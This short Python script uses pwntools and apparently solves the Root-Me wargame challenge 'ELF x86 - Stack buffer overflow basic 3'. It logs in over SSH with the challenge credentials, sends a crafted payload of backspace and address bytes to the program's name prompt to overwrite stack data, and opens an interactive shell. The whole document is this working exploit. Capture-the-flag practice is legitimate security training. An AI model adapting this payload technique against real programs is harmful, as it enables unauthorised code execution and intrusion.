#!/usr/bin/env python
from pwn import *

shell = ssh('app-systeme-ch16', 'challenge02.root-me.org', password='app-systeme-ch16', port=2222)

p = shell.run('./ch16')

p.recvuntil('Enter your name: ')

p.send('\x08\xbf\x08\x08\xff\x08\x08\xfa\x08\x08\xbc')

p.recvrepeat(0.1) == '\b'

p.interactive()

p.close()

shell.close()

# ELF x86 - Stack buffer overflow basic 3
